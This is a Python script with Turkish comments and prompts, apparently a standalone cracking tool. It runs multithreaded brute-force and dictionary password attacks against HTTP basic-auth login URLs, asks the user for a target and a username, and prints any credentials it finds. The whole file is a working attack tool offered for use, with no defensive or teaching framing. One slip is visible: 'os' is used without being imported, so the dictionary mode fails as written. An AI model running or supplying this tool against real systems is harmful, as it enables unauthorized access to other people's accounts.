#!/usr/bin/env python3

import requests
import threading
import time
import itertools
import string
from datetime import datetime
from queue import Queue

# Varsayılan değerler
DEFAULT_THREADS = 10
CHARSET = string.ascii_lowercase + string.digits  # a-z ve 0-9
MIN_LENGTH = 1
MAX_LENGTH = 4

def print_header():
    print(r"""
  ____                  _               _             
 / ___|  ___  _ __ ___ (_) ___  _ __   (_) ___  _ __  
 \___ \ / _ \| '_ ` _ \| |/ _ \| '_ \  | |/ _ \| '_ \ 
  ___) | (_) | | | | | | | (_) | | | | | | (_) | | | |
 |____/ \___/|_| |_| |_|_|\___/|_| |_|_|_|\___/|_| |_|""")
   
    print("\n****************************************************************")

def get_target_info():
    """Hedef bilgileri ve saldırı türünü kullanıcıdan al."""
    target_url = input("\nLütfen hedef URL’yi girin (örneğin http://example.com/login): ").strip()
    username = input("Lütfen kullanıcı adını girin: ").strip()
    threads = input("Kaç thread kullanmak istiyorsunuz? (varsayılan 10, boş bırakabilirsiniz): ")
    threads = int(threads) if threads.strip() else DEFAULT_THREADS

    print("\nSaldırı türü seçin:")
    print("0 - Brute Force Saldırısı")
    print("1 - Sözlük Saldırısı")
    while True:
        attack_type = input("Seçiminiz (0 veya 1): ")
        if attack_type in ["0", "1"]:
            break
        print("Lütfen geçerli bir seçim yapın (0 veya 1).")

    wordlist = None
    if attack_type == "1":
        wordlist = input("Lütfen wordlist dosyasının yolunu girin (örneğin passwords.txt): ").strip()
        if not wordlist or not os.path.exists(wordlist):
            print("Geçerli bir wordlist dosyası girmediniz. Çıkılıyor...")
            exit(1)

    return target_url, username, threads, attack_type, wordlist

def try_login(target_url, username, password):
    """Hedef URL’ye kullanıcı adı ve parola ile giriş denemesi yap."""
    try:
        response = requests.get(target_url, auth=(username, password), timeout=5)
        if response.status_code == 200:
            return True, f"[+] Başarılı giriş! Kullanıcı: {username}, Parola: {password}"
        return False, f"[-] Başarısız: {username}:{password}"
    except requests.exceptions.RequestException:
        return False, f"[-] Bağlantı hatası: {username}:{password}"
    except Exception as e:
        return False, f"[-] Hata: {str(e)}"

def brute_force_worker(target_url, username, queue, found_flag):
    """Brute force saldırısı için thread worker."""
    while not queue.empty() and not found_flag.is_set():
        password = queue.get()
        success, message = try_login(target_url, username, password)
        print(message)
        if success:
            found_flag.set()
        queue.task_done()

def dictionary_worker(target_url, username, passwords, start, end, found_flag):
    """Sözlük saldırısı için thread worker."""
    for i in range(start, end):
        if found_flag.is_set():
            break
        password = passwords[i].strip()
        success, message = try_login(target_url, username, password)
        print(message)
        if success:
            found_flag.set()

def generate_passwords(min_length, max_length, charset):
    """Brute force için parola kombinasyonlarını üret."""
    for length in range(min_length, max_length + 1):
        for combination in itertools.product(charset, repeat=length):
            yield "".join(combination)

def load_wordlist(wordlist_file):
    """Wordlist dosyasını yükle."""
    with open(wordlist_file, "r", encoding="utf-8", errors="ignore") as f:
        return [line for line in f]

def start_brute_force(target_url, username, num_threads):
    """Brute force saldırısını başlat."""
    print(f"\nBrute Force saldırısı başlatılıyor: {target_url}")
    print(f"Kullanıcı: {username}, Karakter seti: {CHARSET}, Parola uzunluğu: {MIN_LENGTH}-{MAX_LENGTH}")
    print(f"Başlangıç zamanı: {datetime.now()}")
    print("Çıkmak için Ctrl+C tuşlayın.")

    queue = Queue()
    found_flag = threading.Event()

    # Parola kombinasyonlarını sıraya ekle
    for password in generate_passwords(MIN_LENGTH, MAX_LENGTH, CHARSET):
        queue.put(password)

    threads = []
    for i in range(num_threads):
        thread = threading.Thread(target=brute_force_worker, args=(target_url, username, queue, found_flag), name=f"Thread-{i}")
        thread.daemon = True
        threads.append(thread)
        thread.start()

    for thread in threads:
        thread.join()

def start_dictionary_attack(target_url, username, num_threads, wordlist_file):
    """Sözlük saldırısını başlat."""
    print(f"\nSözlük saldırısı başlatılıyor: {target_url}")
    print(f"Kullanıcı: {username}, Wordlist: {wordlist_file}")
    print(f"Başlangıç zamanı: {datetime.now()}")
    print("Çıkmak için Ctrl+C tuşlayın.")

    passwords = load_wordlist(wordlist_file)
    total_passwords = len(passwords)
    chunk_size = total_passwords // num_threads
    found_flag = threading.Event()

    threads = []
    for i in range(num_threads):
        start = i * chunk_size
        end = (i + 1) * chunk_size if i < num_threads - 1 else total_passwords
        thread = threading.Thread(target=dictionary_worker, args=(target_url, username, passwords, start, end, found_flag), name=f"Thread-{i}")
        thread.daemon = True
        threads.append(thread)
        thread.start()

    for thread in threads:
        thread.join()

def main():
    print_header()
    target_url, username, num_threads, attack_type, wordlist = get_target_info()
    try:
        if attack_type == "0":
            start_brute_force(target_url, username, num_threads)
        else:
            start_dictionary_attack(target_url, username, num_threads, wordlist)
    except KeyboardInterrupt:
        print("\nSaldırı durduruldu. Çıkılıyor...")
    except Exception as e:
        print(f"\nBeklenmedik bir hata oluştu: {str(e)}")

if __name__ == "__main__":
    main()
